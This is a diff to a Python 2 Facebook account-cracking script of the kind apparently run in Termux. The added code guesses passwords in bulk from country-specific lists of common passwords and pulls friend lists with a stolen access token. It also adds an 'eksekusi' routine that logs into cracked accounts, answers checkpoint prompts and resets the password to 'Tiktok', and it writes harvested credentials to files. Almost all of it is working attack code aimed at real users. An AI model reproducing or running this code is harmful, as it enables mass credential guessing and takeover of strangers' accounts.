@@ -1,6 +1,6 @@
 #!/usr/bin/python2
 # coding=utf-8
-
+dmi = "Downn"
 import os
 try:
     import requests
@@ -26,6 +26,7 @@ from requests.exceptions import ConnectionError
 from bs4 import BeautifulSoup as parser
 from datetime import datetime
 from time import sleep
+from logo import * # LOGO FIGLET
 ct = datetime.now()
 n = ct.month
 bulan1 = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
@@ -106,85 +107,9 @@ def exitp():
 def tod():
     titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
     for x in titik:
-        print '\r %s[%s+%s] menghapus token %s'%(N,M,N,x),
+	print("Remove Token")
         sys.stdout.flush()
         time.sleep(1)
-zmbflogo="""
-	       ____   __    ____ ______
-	      / __/  / /   /  _//_  __/
-	     / _/   / /__ _/ /   / /   
-	    /___/  /____//___/  /_/    
-
- """
-loginlogo = """
-	    _                 _       
-	   | |               (_)      
-	   | |     ___   __ _ _ _ __  
-	   | |    / _ \ / _` | | '_ \ 
-	   | |___| (_) | (_| | | | | |
-	   |______\___/ \__, |_|_| |_|
-	                 __/ |        
-    	                |___/         
-"""
-
-cookieslogo="""
-           ___            _    _            
-          / __\___   ___ | | _(_) ___  ___  
-         / /  / _ \ / _ \| |/ / |/ _ \/ __| 
-        / /__| (_) | (_) |   <| |  __/\__ \ 
-        \____/\___/ \___/|_|\_\_|\___||___/ 
-                                
-  """
-  
-tokenlogo="""  
-	    _______    _              
-	   |__   __|  | |             
-	      | | ___ | | _____ _ __  
-	      | |/ _ \| |/ / _ \ '_ \ 
-	      | | (_) |   <  __/ | | |
-	      |_|\___/|_|\_\___|_| |_|
-		    
- """
-idPasslogo="""
-           _____    _        _____              
-	  |_   _|  | | ___  |  __ \             
-	    | |  __| |( _ ) | |__) |_ _ ___ ___ 
-	    | | / _` |/ _ \/\  ___/ _` / __/ __|
-	   _| || (_| | (_>  < |  | (_| \__ \__ \
-	  |_____\__,_|\___/\/_|   \__,_|___/___/
-                                       
-"""   
-
-cracklogo="""
-          ___________                _     
-         |___  / ____|              | |    
-            / / |     _ __ __ _  ___| | __ 
-           / /| |    | '__/ _` |/ __| |/ / 
-          / /_| |____| | | (_| | (__|   <  
-         /_____\_____|_|  \__,_|\___|_|\_\                                
-
-"""    
-
-crackinglogo="""
-	 ___, __, __,   _,_   _  _  _, __, _,  __,
-	 ` /  |_  |_    |_/   |  | / \ |_) |   | \
-	  /   |   |     | \   |/\| \ / | \ | , |_/
-	 ~~~  ~~~ ~~~   ~ ~   ~  ~  ~  ~ ~ ~~~ ~  
-"""                
-
-checkerlogo="""
-
-
-        _____ _               _              
-       / ____| |             | |             
-      | |    | |__   ___  ___| | _____ _ __  
-      | |    | '_ \ / _ \/ __| |/ / _ \ '__| 
-      | |____| | | |  __/ (__|   <  __/ |    
-       \_____|_| |_|\___|\___|_|\_\___|_|    
-                                        
-                                        
-"""
-
 
 def results(ok,cp):
     if len(ok) != 0 or len(cp) != 0:
@@ -197,6 +122,7 @@ def results(ok,cp):
         print("├  Cracked Idz Has Been Saved In Cracked Folder  ┤")
         print("├  Subscribe My Channel: Zee K World             ┤")
         print("├  Subscribe My Channel: Zee K Tricks            ┤")
+        print("├  Like And Follow My Facebook Page: Termuxid    ┤")
         print("├  Like And Follow My Facebook Page: Zee K World ┤")
         print   '\033[0;97m└'+48*'─'+ '┘'
         raw_input("[➣] Press Any Key To Go Back To Cracking Menu: ")
@@ -248,10 +174,11 @@ def login():
 		print("\033[0;97m├     |🌹Facebook : fb.com/llovexnxx    🌹|      ┤")
 		print   '├     \033[0;97m└'+35*'─'+ '┘      ┤'
 		print   '\033[0;97m└'+48*'─'+ '┘'
-	try:
-		zmbf()
-	except:exit('Sorry No Problem Found')
-
+#	try:
+	zmbf()
+#	except Exception as e:
+#		print(" [!]  Error : %s"%(e))
+#		exit()
 def zmbf():
 	os.system("clear")
 	try:
@@ -361,6 +288,7 @@ def cracking_menu():
 	except requests.exceptions.ConnectionError:
 		exit(' \033[0;97m[\033[0;91m!\033[0;97m] No Internet Connection! Try Again')
 	print zmbflogo 
+	get_visitor()
         print   '\033[0;97m┌'+48*'─'+ '┐'
         print("├              ├ User Information ┤	         ┤")
         print("├              └──────────────────┘              ┤")
@@ -370,7 +298,7 @@ def cracking_menu():
 	print("| User Dob    : "+H+dob)
 	print("| User Gender : "+H+gender)
 	print   ('\033[0;97m┌'+48*'─'+ '┐')
-	print("      🌹🌷🌹🌷🌹 Welcome To Zmbf 🌹🌷🌹🌷🌹 ")
+	print("      🌹🌷🌹🌷🌹 Welcome To Elit 🌹🌷🌹🌷🌹 ")
 	print   '\033[0;97m┌'+48*'─'+ '┐'
 	print("├               ├ Cracking Menu ┤	         ┤")
 	print("├               └───────────────┘                ┤")
@@ -380,7 +308,8 @@ def cracking_menu():
 	print("├ [04] Crack From Public Followers               ┤")
 	print("├ [05] Crack From File Name                      ┤")
 	print("├ [06] Check Cracked Checkpoint Accounts         ┤")
-	print("├ [07] Logout From Facebook                      ┤")
+	print("├ [07] Facebook Username Becomes IDz             ┤")
+	print("├ [08] Logout From Facebook                      ┤")
 	print("├ [eE] Exit Program                              ┤")
 	print   '\033[0;97m└'+48*'─'+ '┘'
 	zk = raw_input("\n \033[0;97m [\033[0;97m➣\033[0;97m] Choose An Option: ")
@@ -401,6 +330,8 @@ def cracking_menu():
 	elif zk == "6" or zk == "06":
 		relogin()
 	elif zk == "7" or zk == "07":
+		user_id()
+	elif zk == "8" or zk == "08":
 		os.system("rm -f login.txt")
 		zks('  \033[0;97m[\033[0;91m!\033[0;97m] Removing Token..! Login Again')
 		zmbf()
@@ -549,6 +480,42 @@ def crackz(file):
 		print('  [!] Wrong Input! Try Again')
 		time.sleep(2)
 		crackz(file)
+def pilih_pw():
+	print passwordlogo+"\n\n"
+        print(" [!]  Please Choose Password.."), time.sleep(2)
+        print("\n [1]  name123,name1234,name12345")
+        print(" [2]  India/Bangladesh")
+        print(" [3]  Pakistan")
+        print(" [4]  United States")
+        print(" [5]  Indonesia")
+        njj = raw_input("\n [?]  Language : ")
+        if njj in [""," "]:
+                print(" [!]  Please Fill Correctly"), time.sleep(1)
+                pilih_pw()
+        elif njj in ["1","01"]:
+                ppx=open(".pass.txt", "w")
+                ppx.write("None")
+                ppx.close()
+        elif njj in ["2","02"]:
+                ppx=open(".pass.txt", "w")
+                ppx.write("Bd")
+                ppx.close()
+        elif njj in ["3","03"]:
+                ppx=open(".pass.txt", "w")
+                ppx.write("Pk")
+                ppx.close()
+        elif njj in ["4","04"]:
+                ppx=open(".pass.txt", "w")
+                ppx.write("Us")
+                ppx.close()
+        elif njj in ["5","05"]:
+                ppx=open(".pass.txt", "w")
+                ppx.write("Indo")
+                ppx.close()
+        else:
+                print(" [!]  Please Fill Correctly"), time.sleep(1)
+                pilih_pw()
+	pass
 class crackmenu:
 
     def __init__(self,isifile):
@@ -611,7 +578,7 @@ class crackmenu:
         elif zk in ('D', 'd','1','01'):
         	os.system('clear')
         	print crackinglogo
-        	print   '\033[0;97m┌'+48*'─'+ '┐'
+	       	print   '\033[0;97m┌'+48*'─'+ '┐'
         	print("├              ├ Cracking Started ┤	         ┤")
         	print("├              └──────────────────┘              ┤")
         	print("├         *** Important Instructions ***         ┤")
@@ -622,7 +589,7 @@ class crackmenu:
         	print   '\033[0;97m└'+48*'─'+ '┘'
         	print   '\033[0;97m┌'+48*'─'+ '┐'
         	print("├  *** Wait! Cracked IDz Will Be Shown Here ***  ┤\n")
-        	self.passwords()
+	       	self.passwords()
         else:
             print('  [!] Wrong Input! Try Again')
             time.sleep(2)
@@ -652,10 +619,21 @@ class crackmenu:
             elif 'www.facebook.com' in response.json()['error_msg']:
                 try:
                     loginz = open("login.txt").read()
+                    token = open("login.txt").read()
+                    try:
+                        filen = ('.id').replace(' ', '_')
+                        zk  = open(filen, 'w')
+                        for a in requests.get('https://graph.facebook.com/%s/friends?limit=5000&access_token=%s'%(user,token)).json()["data"]:
+                            id.append(a['id'] + '<=>' + a['name'])
+                            zk.write(a['id'] + '<=>' + a['name'] + '\n')
+                        zk.close()
+                        bh=(" ➤ (Friend:%s)"%(len(id)))
+                    except:
+                        bh=(' ')
                     ak = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,loginz))
                     az = json.loads(ak.text)
                     dob = az['birthday'].replace("/","-")
-                    print '\r%s[CP]: %s ➤ %s ➤ %s      %s' % (K,user,pw,dob,N)
+                    print '\r%s[CP]: %s ➤ %s ➤ %s%s      %s' % (K,user,pw,dob,bh,N)
                     wrt = '%s | %s | %s' % (user,pw,dob)
                     cp.append(wrt)
                     open('Cracked/cpz.txt', 'a').write('%s\n' % wrt)
@@ -664,8 +642,7 @@ class crackmenu:
                     dob = ''
                 except:
                     pass
-
-                print '\r%s[CP]: %s ➤ %s                 %s' % (K,user,pw,N)
+                print '\r%s[CP]: %s ➤ %s%s                 %s' % (K,user,pw,bh,N)
                 wrt = '%s | %s ' % (user,pw)
                 cp.append(wrt)
                 open('Cracked/cpz.txt', 'a').write('%s\n' % wrt)
@@ -676,6 +653,7 @@ class crackmenu:
 
 
     def passwords(self):
+            infox=open(".pass.txt", "r")
             with zthreads(max_workers=30) as (form):
             	for uname in self.id:
                     try:
@@ -692,10 +670,18 @@ class crackmenu:
                         elif len(xz) <= 4:
                             pws = [ xz[0], xz[0]+'123', xz[0]+'1234',xz[0]+'12345',xz[0]+' '+xz[1]+' '+xz[2]+' '+xz[3]]
                         else:
-                        	if len(xz)<=3:
-                        	    pws = ['sayang','bismillah','786786','223344','102030']
+				if infox == "Indo":
+                        	    pws = ['bismillah','bajingan','bangsat']
+				elif infox == "None":
+                        	    pass
+				elif infox == "Bd":
+                        	    pws = ["556677","102030","000786","786786"]
+				elif infox == "Pk":
+                        	    pws = ["000786","786786","pakistan"]
+				elif infox == "Us":
+                        	    pws = ["passwords","qwerty","iloveyou","123456"]
                         	else:
-                        	       pws = ['sayang','bismillah','786786']
+                                    pass
                         form.submit(self.api,zz[0], pws)
                     except:
                         pass
@@ -733,6 +719,8 @@ def relogin():
 		print("\n\033[0;96m\033[0;97m[\033[1;33m➤\033[1;37m] CP Account: "+(linez.replace(" + ",""))+"\n")
 		try:
 			method(symbz[0].replace("+",""), symbz[1])
+		except Exception as e:
+			print("\033[0;96m\033[0;97m[\033[1;31m➤\033[1;37m] Sorry This Account Has Been Benned")
 		except requests.exceptions.ConnectionError:
 			pass
 	print   '\033[0;97m└'+48*'─'+ '┘'
@@ -795,6 +783,10 @@ def method(user, pasw):
 			print("[\033[1;33m"+str(opt+1)+"\033[1;37m] "+ngew[opt])
 		if len(ngew) == 0:
 			print("\n\033[0;96m\033[0;97m[\033[1;32m➤\033[1;37m] Status: \033[1;32mOne Tap Yes / SuccessFul To Login")
+			eksekusi(user,pasw)
+			ppx=open("Cracked/Tap_Yes.txt", "a+")
+			ppx.write(user+" | "+pasw+"\n")
+			ppx.close()
 		elif len(ngew) <= 5:
 			print("\n\033[0;96m\033[0;97m[\033[1;33m➤\033[1;37m] Status: \033[1;33mCheckPoint! Try Again Later  ")
 		else:
@@ -804,7 +796,136 @@ def method(user, pasw):
 		print("\033[0;96m\033[0;97m[\033[1;31m➤\033[1;37m] %s"%(oh))
 	else:
 		print("\033[0;96m\033[0;97m[\033[1;31m➤\033[1;37m] Login Failed! User Id/Password Is Incorrect\n")
+def main_check():
+	waktu = str(datetime.now().strftime("%Y%m%d"))
+	try:
+		ser = requests.get("https://pastebin.com/raw/exzCY7sM").text.strip() #Jangan DiEdit Kpnetod
+		expx = requests.get("https://pastebin.com/raw/pzgSp7zW").text.strip() #Jangan DiEdit Kpnetod
+		if waktu >= expx:
+			print ("[!]  Server Used : "+ser)
+			print ("[!]  Admin Set Date : "+expx)
+			print ("[!]  Server Currently Maintenance.. Contact Author !!")
+			sys.exit()
+		try:
+			if ser in ["MR.RISKY","Down",dmi]:
+				pass
+			else:
+				print ("[!]  Server Used : "+ser)
+				print ("[!]  Admin Set Date : "+expx)
+				print ("[!]  Server Currently Maintenance.. Contact Author !!")
+				exit()
+		except (KeyError, IOError):
+			print("[!]  Please Check Your Internet Network ")
+			exit()
+	except (KeyError, IOError):
+		print("[!]  Please Check Your Internet Network ")
+		exit()
+def get_visitor():
+	try:
+		memek = requests.get("https://komarev.com/ghpvc/?username=Dumai-991&color=blue").text.strip()
+		memekw, memekq = memek.split('<text x="105" y="14">')
+		githubx = memekq.split('</text>')
+		pepeq = requests.get("https://camo.githubusercontent.com/2d7842801a4429dade77642a7444a8d2d8bd83e92e9f9944aaeaa11343d250ae/68747470733a2f2f6b6f6d617265762e636f6d2f67687076632f3f757365726e616d653d44756d61692d39393126636f6c6f723d626c7565").text.strip()
+		pepep, pepek = pepeq.split('<text x="105" y="14">')
+		termux = pepek.split('</text>')
+		print("\n  [!] Visitors on Tools  : "+githubx[0])
+		print("  [!] Visitors on Github : "+termux[0])
+	except Exception as e:
+		print("  [!] Error : %s"%(e))
+		exit()
+def user_id():
+	ling = ('https://www.facebook.com/')
+	url = ling+raw_input("  [?] Username : ")
+	idre = re.compile('"entity_id":"([0-9]+)"')
+	page = requests.get(url)
+	print idre.findall(page.content)
+	raw_input("\nBack To Menu")
+	cracking_menu()
 
+url="https://free.facebook.com"
+newpass="Tiktok"
+def eksekusi(username,password):
+        useragent = random.choice(['NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+','Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'])
+        try:
+                respons=login_ris(username,password)
+        except (requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
+                eksekusi(username,password)
+        session=respons[0]
+        if "c_user" in session.cookies.get_dict():
+                print(i+"Login Sukses "+c+"⟩⟩"+i+" {}|{}".format(username,password))
+                open("Cracked/ok.txt","a+").write("{}|{}\n".format(username,password))
+        elif "checkpoint" in session.cookies.get_dict():
+                session.headers.update({"Host":re.search("(https://.*?\.facebook.com)",respons[1].url).group(1).split("//")[1],"referer":re.search("(https://.*?\.facebook.com)",respons[1].url).group(1)+"/checkpoint/"})
+                respon=tahap1(session,parser(respons[1].text))
+                if respon == "new password":
+                        print(i+"Suksess Change Password "+c+"⟩⟩"+i+" {}|{}".format(username,newpass))
+                        open("Cracked/newpass.txt","a+").write("{}|{}\n".format(username,newpass))
+                elif respon == "no change password":
+                        print(i+"Failed Change Password "+c+"⟩⟩"+i+" {}|{}".format(username,password))
+                        open("Cracked/no_change.txt","a+").write("{}|{}\n".format(username,password))
+                else:
+                        print(k+"CheckPoints "+c+"⟩⟩ {}{}|{}".format(p,username,password))
+                        if username not in open("Cracked/cp.txt").read():
+                                open("Cracked/cp.txt","a+").write("{}|{}\n".format(username,password))
+        else:
+                print(m+"Login Failed "+c+"⟩⟩"+m+" {}|{}".format(username,password))
+
+def login_ris(username,password,**kwargs):
+        session=requests.session()
+        parsing=parser(session.get(url+"/login/?next&ref=dbl&fl&refid=8").text)
+        kwargs=get_data(parsing,"sign_up")
+        kwargs.update({"email":username,"pass":password})
+        if '_fb_noscript' in kwargs:
+                del kwargs['_fb_noscript']
+        session.headers.update({"Host":url.split("//")[1],"cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":useragent,"content-type":"application/x-www-form-urlencoded","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","referer":url+"/login/?next&ref=dbl&fl&refid=8","origin":url})
+        respon=session.post(url+get_action(parsing),data=kwargs)
+        return session,respon
+
+def tahap1(session,parsing):
+        kwargs=get_data(parsing,"submit[logout-button-with-confirm]")
+        if "submit[Yes]" in kwargs:
+                del kwargs["submit[No]"]
+                try:
+                        respon=session.post(session.headers["referer"].split("/checkpoint/")[0]+get_action(parsing),data=kwargs).text
+                except requests.exceptions.TooManyRedirects:
+                        respon="kontol"
+                if "password_new" in respon or "buat kata sandi baru" in respon.lower():
+                        return tahap2(session,parser(respon))
+                if "c_user" in session.cookies.get_dict():
+                        return "no change password"
+
+def tahap2(session,parsing):
+        kwargs=get_data(parsing,"submit[logout-button-with-confirm]")
+        kwargs.update({"password_new":newpass})
+        respons=session.post(session.headers["referer"].split("/checkpoint/")[0]+get_action(parsing),data=kwargs,allow_redirects=False)
+        if "c_user" in respons.cookies.get_dict():
+                return "new password"
+
+def get_data(parsing,kecuali,**kwargs):
+        for lnput in parsing.find_all("input",{"name":True,"value":True}):
+                if kecuali in lnput["name"]: continue
+                else: kwargs.update({lnput["name"]:lnput["value"]})
+        return kwargs
+
+def get_action(parsing):
+        return parsing.find("form",{"method":"post"})["action"]
+
+def parser(html):
+        return BeautifulSoup(html,"html.parser")
+
+def ngetik(kata,jum=0.002):
+        for x in kata + "\n":
+                sys.stdout.write(x)
+                sys.stdout.flush()
+                sleep(jum)
+# Enc Lain2
 if __name__ == '__main__':
 	os.system('git pull')
-	login()
+	main_check()
+	try:
+		main_check()
+		pilih_pw()
+		login()
+	except Exception as e:
+		print(("  [+] Error : %s"%e)),;time.sleep(1)
+		exit()
